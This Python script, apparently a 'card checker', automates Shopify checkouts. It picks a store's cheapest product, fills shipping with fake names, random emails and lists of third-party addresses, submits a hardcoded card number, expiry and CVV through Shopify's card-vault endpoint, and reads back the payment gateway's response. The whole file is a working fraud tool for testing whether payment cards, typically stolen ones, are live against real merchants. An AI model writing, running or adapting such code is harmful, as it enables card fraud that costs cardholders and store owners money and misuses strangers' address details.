# === ./apisites/autoshop.py === #
# dev by @benjaa1 in colab with LowSites 低

from urllib.parse import urlparse
import aiohttp, asyncio, random, string
from bs4 import BeautifulSoup
from huepy import red, green, blue, yellow
# == Aux funcs === #
def getstr(text: str, a: str, b: str) -> str:
    return text.split(a)[1].split(b)[0]

async def getindex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(await response.text())

def email_generator():
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8, 12))
    correo = usuario + '@' + 'gmail.com'
    return correo  

def get_random_string(length):
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for _ in range(length))
    return result_str

# == Main funcs === #
def country_domain(domain: str):
    if ".com.au" in domain:
        return "AU"
    elif ".co.uk" in domain or ".uk" in domain:
        return "UK"
    elif ".ca" in domain:
        return "CA"
    elif ".com.ar" in domain:
        return "AR"
    elif ".us" in domain or domain.endswith(".com"):
        return "US"
    elif ".ae" in domain:
        return "AE"
    elif ".gt" in domain:
        return "GT"
    return None

def country_checkout(page_content: str):
    countrylist = {
        "US": ["United States", "USA", "us"],
        "AU": ["Australia", "AU"],
        "UK": ["United Kingdom", "UK"],
        "CA": ["Canada", "CA"],
        "AR": ["Argentina", "AR"],
        "AE": ["United Arab Emirates", "AE"],
        "GT": ["Guatemala", "GT"],
    }
    
    country_scores = {key: 0 for key in countrylist}

    for country_code, indicators in countrylist.items():
        for indicator in indicators:
            country_scores[country_code] += page_content.lower().count(indicator.lower())
    
    detected_country = max(country_scores, key=country_scores.get)

    if country_scores[detected_country] == 0:
        return None
    
    return detected_country

def address_for_country(country_code: str):
    addresses = {
        "US": [
            ("6400 S Lewiston Way", "Aurora", "Colorado", "80016", "(713) 278-2582", "United States"),
            ("6923 Lakewood Dr W #3", "Tacoma", "Washington", "98467", "(253) 582-2125", "United States"),
            ("6400 S Lewiston Way", "Aurora", "Colorado", "80016", "(713) 278-2582", "United States"),
            ("6400 S Lewiston Way", "Aurora", "Colorado", "80016", "(713) 278-2582", "United States"),
            ("1776 William Kennerty Drivee", "Charleston", "South Carolina", "29407", "(951) 656-4411", "United States"),
            ("202 E Chicago St", "Jonesville", "Michigan", "49250", "", "United States"),
            ("202 E Chicago St", "Jonesville", "Michigan", "49250", "", "United States"),
            ("202 E Chicago St", "Jonesville", "Michigan", "49250", "", "United States"),
            ("1776 William Kennerty Drivee", "Charleston", "South Carolina", "29407", "(951) 656-4411", "United States"),
        ],
        "UK": [
            ("105 Ravenhurst St", "Birmingham", "West Midlands", "B12 0HB", "(879) 658-2525", "United Kingdom"),
            ("17 Tewin Rd", "Welwyn Garden City",  "", "AL7 1BD", "01707 371619", "United Kingdom"),
            ("17 Tewin Rd", "Welwyn Garden City", "Herts", "AL7 1BD", "01707 371619", "United Kingdom"),
            ("17 Tewin Rd", "Welwyn Garden City", "Herts", "AL7 1BD", "01707 371619", "United Kingdom"),
            ("17 Tewin Rd", "Welwyn Garden City", "Herts", "AL7 1BD", "01707 371619", "United Kingdom"),
            ("17 Tewin Rd", "Welwyn Garden City", "Herts", "AL7 1BD", "01707 371619", "United Kingdom"),
            ("Dipton Mill Woods Path", "Hexham", "Northumberland", "NE46 1YA", "01434 606577", "United Kingdom"),
            ("12 Oxford Rd", "Uxbridge", "Middlesex", "UB9 4DQ", "01895 230059", "United Kingdom"),
        ],
        "CA": [
            ("101 Osler Dr #134b", "Dundas", "Ontario", "L9H 4H4", "(905) 627-5353", "Canada"),
            ("1000 James Boulevard", "Gander", "NL", "A1V 1W8", "(905) 627-5353", "Canada"),
            ("3235 Lake Shore Blvd W", "Toronto", "Ontario", "M8V 1M2", "(416) 259-4169", "Canada"),
            ("451 Avenue Duluth Est", "Montréal", "Quebec", "H2L 1A6", "(514) 840-9999", "Canada"),
            ("1290 Tecumseh Rd E", "Windsor", "Ontario", "N8W 1B6", "(519) 258-7656", "Canada"),
        ],
        "AU": [
            ("134 Buckhurst Street", "South Melbourne", "VIC", "3205", "(879) 658-2525", "Australia"),
            ("3/4 Kenny St", "Wollongong City Council", "New South Wales", "2500", "(02) 4226 1432", "Australia"),
            ("3/149 West St", "Sydney", "New South Wales", "2065", "(02) 9448 4442", "Australia"),
            ("84 Brunswick St", "Brisbane City", "Queensland", "4006", "(07) 3852 1183", "Australia"),
        ],
        "AR": [
            ("Paseo Roque Sanchez Galdeano S/n", "Ushuaia", "Tierra del Fuego", "V9410 BJE", "02901 43-1232", "Argentina"),
            ("Junín 1743", "Buenos Aires", "Ciudad Autónoma de Buenos Aires", "C1128ACC", "011 2050-5858", "Argentina"),
            ("Avenida Sta Rosa 0", "La Rioja", "La Rioja", "F5300", "03822 42-0133", "Argentina"),
            ("Av General Iriarte 2200", "Buenos Aires", "Ciudad Autónoma de Buenos Aires", "1276", "011 4301-0254", "Argentina"),
        ],
        "AE": [
            ("Box No 64896", "Dubai", "Dubai", "23075", "97143315186", "United Arab Emirates"),
            ("Box No. 233425", "Dubai", "Dubai", "23075", "971-3537538", "United Arab Emirates"),
            ("P.O Box 16993", "Dubai", "Dubai", "23075", "971-3511465", "United Arab Emirates"),
            ("P.O Box 116326", "Dubai", "Dubai", "23075", "9971-3537538", "United Arab Emirates"),
            ("P.O. Box 23382, al Qasmiya", "Sharjah", "Sharjah", "23075", "971-04-2650251", "United Arab Emirates"),

        ],
        "GT": [
            ("4 C Poniente No.17 Antigua Guatemala", "Sacatepequez", "Antigua", "142.28603.23-4", "'4480405401512'", "Guatemala"),
            ("5 C 2-48 Z-2 Cond Sbartolomé, suchi", "Sacatepequez", "Antigua", "144.46107.27-1", "'2261162096640'", "Guatemala"),
            ("7 Av Final 3 C Oriente No.21 San Lucas Sacatepequez", "Sacatepequez", "Antigua", "139.25887.25-2", "'9743635825450'", "Guatemala"),
            ("5 Av Norte No.35 Antigua Guatemala", "Sacatepequez", "Antigua", "115.62398.87-8", "'1677675044876'", "Guatemala"),
        ],
    
    }
    return addresses.get(country_code, [])

async def create_session():
    conn = aiohttp.TCPConnector(ssl=False, force_close=True)
    return aiohttp.ClientSession(connector=conn)

async def find_product(site):
    if "://" in site:
        parsed_url = urlparse(site)
        domain = parsed_url.netloc
    else:
        domain = site

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
    }

    async with await create_session() as session:
        try:
            async with session.get(f"https://{domain}/products.json", headers=headers, timeout=27) as resp:
                content_type = resp.headers.get('Content-Type', '')
                if resp.status == 200 and 'application/json' in content_type:
                    try:
                        result = await resp.json()
                        if "products" in result:
                            products = result["products"]
                        else:
                            print(red("Products not found."))
                            return
                    except aiohttp.ContentTypeError:
                        print(red("Error decoding JSON."))
                        return
                else:
                    print(red(f"Error: Status {resp.status} or not JSON resp."))
                    return
        except Exception as e:
            print(f"Error GET site, put data: {site}\nException: {e}")
            return

    min_price = float('inf')
    min_product = None

    for product in products:
        for variant in product['variants']:
            if variant['available'] and float(variant['price']) < min_price and float(variant['price']) > 0.15:
                min_price = float(variant['price'])
                min_product = {
                    'title': product['title'],
                    'price': variant['price'],
                    'product_id': variant['id'],
                    'link': product['handle']
                }

    if min_product is not None:
        p_id = min_product['product_id']
        enlace = f"https://{domain}/products/{min_product['link']}"
        return p_id, enlace
    else:
        return

async def autoshopify(session, checkout_url, p_id, cc, proxy=None):
    email = email_generator()
    proxy = None # put proxy here if u have
    card = cc.split("|")
    cn = card[0]
    month = card[1]
    year = card[2]
    cvv = card[3]
    gateway_string = "shopify_"

    parsed_url = urlparse(checkout_url)
    domain = parsed_url.netloc

    print("Starting AutoShopify...")

    payload_1 = {'id': f'{p_id}'}
    async with await create_session() as session:
        try:
            # === r1: add to cart ===#
            async with session.post(url=f'https://{domain}/cart/add.js', data=payload_1, proxy=proxy) as r1:
                if r1.status != 200:
                    raise Exception("Error adding cart.")
            # === r2: go to checkout ===#
            async with session.post(url=f"https://{domain}/checkout/") as r2:
                checkout_url = str(r2.url)
                print(f"URL checkout: {checkout_url}")

            if not checkout_url or any(segment in checkout_url for segment in ["/cn/", "/co/", "/c/", "/account/", "/login"]):
                detected = next(segment for segment in ["/cn/", "/co/", "/c/", "/account/", "/login"] if segment in checkout_url)
                raise Exception(f"Site not supported. {detected} detected in site.")

        except Exception as e:
            print(red(e))
            return
           
        async with session.get(checkout_url) as checkout_resp:
            checkout_text = await checkout_resp.text()
        
        detected_country = country_domain(domain) or country_checkout(checkout_text)
        addresses = address_for_country(detected_country) if detected_country else []

        if not addresses:
            addresses = [address for country in ["US", "UK", "AU", "CA", "AR"] for address in address_for_country(country)]

        valid_shipping_found = False
        for address_info in addresses:
            addres, city, state, zip, phone, dicc = address_info
            print("Trying Address:", addres)
            atoken = get_random_string(86)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
            }

            if detected_country == "AE":
                payload_2 = [
                    ('_method', 'patch'),
                    ('authenticity_token', f'{atoken}'),
                    ('previous_step', 'contact_information'),
                    ('step', 'shipping_method'),
                    ('checkout[email]', email),
                    ('checkout[buyer_accepts_marketing]', '0'),
                    ('checkout[shipping_address][first_name]', 'Anna'),
                    ('checkout[shipping_address][last_name]', 'Smith'),
                    ('checkout[shipping_address][company]', ''),
                    ('checkout[shipping_address][address1]', f'{addres}'),
                    ('checkout[shipping_address][address2]', '# 29407'),
                    ('checkout[shipping_address][city]', f'{city}'),
                    ('checkout[shipping_address][country]', f'{dicc}'),
                    ('checkout[shipping_address][province]', f'{state}'),
                    ('checkout[shipping_address][phone]', f'{phone}'),
                    ('checkout[remember_me]', 'false'),
                    ('checkout[client_details][browser_width]', '432'),
                    ('checkout[client_details][browser_height]', '780'),
                    ('checkout[client_details][javascript_enabled]', '1'),
                    ('checkout[client_details][color_depth]', '24'),
                    ('checkout[client_details][java_enabled]', 'false'),
                    ('checkout[client_details][browser_tz]', '300'),
                ]
            elif detected_country == "GT":
                payload_2 = [
                    ('_method', 'patch'),
                    ('authenticity_token', f'{atoken}'),
                    ('previous_step', 'contact_information'),
                    ('step', 'shipping_method'),
                    ('checkout[email]', email),
                    ('checkout[buyer_accepts_marketing]', '0'),
                    ('checkout[buyer_accepts_marketing]', '1'),
                    ('checkout[pick_up_in_store][selected]', 'false'),
                    ('checkout[id]', 'delivery-shipping'),
                    ('checkout[shipping_address][country]', f'{dicc}'),
                    ('checkout[shipping_address][first_name]', 'Anne'),
                    ('checkout[shipping_address][last_name]', 'Lois'),
                    ('checkout[shipping_address][address1]', f'{addres}'),
                    ('checkout[shipping_address][address2]', 'No. 17'),
                    ('checkout[shipping_address][city]', f'{city}'),
                    ('checkout[shipping_address][province]', 'SAC'),
                    ('checkout[shipping_address][zip]', f'{zip}'),
                    ('checkout[shipping_address][phone]', '9514365989'),
                    ('checkout[attributes][dpi]', f'{phone}'),
                    ('checkout[attributes][location]', '43828084873'),
                    ('checkout[attributes][location_name]', 'Antigua Guatemala'),
                    ('checkout[remember_me]', ''),
                    ('checkout[remember_me]', '0'),
                    ('checkout[client_details][browser_width]', '1263'),
                    ('checkout[client_details][browser_height]', '593'),
                    ('checkout[client_details][javascript_enabled]', '1'),
                    ('checkout[client_details][color_depth]', '24'),
                    ('checkout[client_details][java_enabled]', 'false'),
                    ('checkout[client_details][browser_tz]', '360'),
                ]   
            else:
                payload_2 = [
                ('_method', 'patch'),
                ('authenticity_token', f'{atoken}'),
                ('previous_step', 'contact_information'),
                ('step', 'shipping_method'),
                ('checkout[email]', email),
                ('checkout[buyer_accepts_marketing]', '0'),
                ('checkout[shipping_address][first_name]', 'Anna'),
                ('checkout[shipping_address][last_name]', 'Smith'),
                ('checkout[shipping_address][company]', ''),
                ('checkout[shipping_address][address1]', f'{addres}'),
                ('checkout[shipping_address][address2]', '# 29407' or '29047'),
                ('checkout[shipping_address][city]', f'{city}'),
                ('checkout[shipping_address][country]', f'{dicc}'),
                ('checkout[shipping_address][province]', f'{state}'),
                ('checkout[shipping_address][zip]', f'{zip}'),
                ('checkout[shipping_address][phone]', f'{phone}'),
                ('checkout[remember_me]', 'false'),
                ('checkout[client_details][browser_width]', '432'),
                ('checkout[client_details][browser_height]', '780'),
                ('checkout[client_details][javascript_enabled]', '1'),
                ('checkout[client_details][color_depth]', '24'),
                ('checkout[client_details][java_enabled]', 'false'),
                ('checkout[client_details][browser_tz]', '300'),
            ]
            async with session.post(url=checkout_url, headers=headers, data=payload_2, proxy=proxy) as r3:
                # === r3: Shipping === #
                async with session.get(url=checkout_url+"?previous_step=contact_information&step=shipping_method") as r4:
                    # === r4: valid shipping method=== #
                    r4_text = await r4.text()
                    if "data-shipping-method" in r4_text:
                        try:
                            price_send = BeautifulSoup(r4_text, 'html.parser').find("div", {"class":"radio-wrapper"})["data-shipping-method"]
                        except:
                            price_send = "shopify-UPS%20Ground%20Shipping-0.00"
                    else:
                        price_send = "shopify-UPS%20Ground%20Shipping-0.00"

                print("Shipping price: ", price_send)

                if price_send != "shopify-UPS%20Ground%20Shipping-0.00":
                    valid_shipping_found = True
                    break
                else:
                    continue

        if not valid_shipping_found:
            all_countries = ["US", "UK", "AU", "CA", "AR"]
            additional_addresses = []
            for country in all_countries:
                additional_addresses.extend(address_for_country(country))
            
            for address_info in additional_addresses:
                addres, city, state, zip, phone, dicc = address_info
                print("Trying more addresses:", addres)

                atoken = get_random_string(86)
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
                }

                payload_2 = [
                    ('_method', 'patch'),
                    ('authenticity_token', f'{atoken}'),
                    ('previous_step', 'contact_information'),
                    ('step', 'shipping_method'),
                    ('checkout[email]', email),
                    ('checkout[buyer_accepts_marketing]', '0'),
                    ('checkout[shipping_address][first_name]', 'Anna'),
                    ('checkout[shipping_address][last_name]', 'Smith'),
                    ('checkout[shipping_address][company]', ''),
                    ('checkout[shipping_address][address1]', f'{addres}'),
                    ('checkout[shipping_address][address2]', '# 29407'),
                    ('checkout[shipping_address][city]', f'{city}'),
                    ('checkout[shipping_address][country]', f'{dicc}'),
                    ('checkout[shipping_address][province]', f'{state}'),
                    ('checkout[shipping_address][zip]', f'{zip}'),
                    ('checkout[shipping_address][phone]', f'{phone}'),
                    ('checkout[remember_me]', 'false'),
                    ('checkout[client_details][browser_width]', '432'),
                    ('checkout[client_details][browser_height]', '780'),
                    ('checkout[client_details][javascript_enabled]', '1'),
                    ('checkout[client_details][color_depth]', '24'),
                    ('checkout[client_details][java_enabled]', 'false'),
                    ('checkout[client_details][browser_tz]', '300'),
                ]

                async with session.post(url=checkout_url, headers=headers, data=payload_2, proxy=proxy) as r3:
                    # === r3: shipping === #
                    async with session.get(url=checkout_url+"?previous_step=contact_information&step=shipping_method") as r4:
                        # === r4: valid shipping method=== #
                        r4_text = await r4.text()
                        if "data-shipping-method" in r4_text:
                            try:
                                price_send = BeautifulSoup(r4_text, 'html.parser').find("div", {"class":"radio-wrapper"})["data-shipping-method"]
                            except:
                                price_send = "shopify-UPS%20Ground%20Shipping-0.00"
                        else:
                            price_send = "shopify-UPS%20Ground%20Shipping-0.00"

                    print("Shipping price: ", price_send)

                    if price_send != "shopify-UPS%20Ground%20Shipping-0.00":
                        valid_shipping_found = True
                        break
                    else:
                        continue

        if not valid_shipping_found:
            return red("Shipping method error")
        
        payload_3 = {
            '_method': 'patch',
            'authenticity_token': f'{atoken}',
            'previous_step': 'shipping_method',
            'step': 'payment_method',
            'checkout[shipping_rate][id]': f'{price_send}',
            'checkout[client_details][browser_width]': '432',
            'checkout[client_details][browser_height]': '780',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '300',
        }
        try:
            async with session.post(url=checkout_url, headers=headers, data=payload_3, proxy=proxy) as r5:
                # === r5: shipping method step === #
                if r5.status != 200:
                    return red("Failed at shipping method step.")
                
                async with session.get(url=checkout_url+"?previous_step=shipping_method&step=payment_method") as r6:
                    # === r6: payment method === #
                    r6_text = await r6.text()
                    try:
                        pricos = BeautifulSoup(r6_text, 'html.parser').find("span", {"class":"order-summary__emphasis total-recap__final-price skeleton-while-loading"})
                        total_price = pricos.text.strip()
                        idpay = BeautifulSoup(r6_text, 'html.parser').find("ul", {"role":"list"})['data-brand-icons-for-gateway']
                        last_price = BeautifulSoup(r6_text, 'html.parser').find("span", {"class":"order-summary__emphasis total-recap__final-price skeleton-while-loading"})['data-checkout-payment-due-target']
                        print(total_price)
                    except Exception  as e:
                        return red('Error getting IDPay, change site or try again.')
            payload_4 = {
                "credit_card": {
                    "number": f"{cn[0:4]} {cn[4:8]} {cn[8:12]} {cn[12:16]}",
                    "name": "Anna Smith",
                    "month": month,
                    "year": year,
                    "verification_value": cvv
                },
                "payment_session_scope": f"{domain}"
            }

            async with session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4, proxy=proxy) as r7:
                # === r7: payment method step === #
                token = await r7.json()
                id_ = token.get('id')

            payload_5 = {
                '_method': 'patch',
                'authenticity_token': f'{atoken}',
                'previous_step': 'payment_method',
                'step': '',
                's': f'{id_}',
                'checkout[payment_gateway]': f'{idpay}',
                'checkout[credit_card][vault]': 'false',
                'checkout[different_billing_address]': 'false',
                'checkout[total_price]': f'{last_price}',
                'complete': '1',
                'checkout[client_details][browser_width]': '432',
                'checkout[client_details][browser_height]': '780',
                'checkout[client_details][javascript_enabled]': '1',
                'checkout[client_details][color_depth]': '24',
                'checkout[client_details][java_enabled]': 'false',
                'checkout[client_details][browser_tz]': '300',
            }
            
            async with session.post(url=checkout_url, headers=headers, data=payload_5, proxy=proxy) as r8:
                # === r8: payment processing === #
                processing_url = r8.url
                async with session.get(str(processing_url) + '?from_processing_page=1') as r9:
                    # === r9: payment processing step === #
                    async with session.get(r9.url) as r10:
                        # === r10: get response === #
                        await asyncio.sleep(4)
                        text_resp = await r10.text()
                        try:
                            gateway = getstr(text_resp, '"gateway":"', '"')
                            gateway_string = f'{gateway}' if "shopify" in gateway else f'shopify_{gateway}'
                        except IndexError:
                            gateway_string = "shopify_"
                        print(blue(gateway_string))
                        try:
                            resp = getstr(text_resp, 'notice__text">', '<')
                        except IndexError:
                            resp = "Response invisble"
                    
                        return resp
        except aiohttp.ClientError as e:
            print(red(e))

async def main():
    while True:
        cc = "5557530004901486|7|2027|372"
        site = input(yellow("Site: "))
        session = None
        result = await find_product(site)
        if isinstance(result, tuple):
            p_id, enlace = result
            resp = await autoshopify(session, enlace, p_id, cc)
            print(green(f"Site response: {resp}"))
        else:
            print(red(result))
asyncio.run(main())

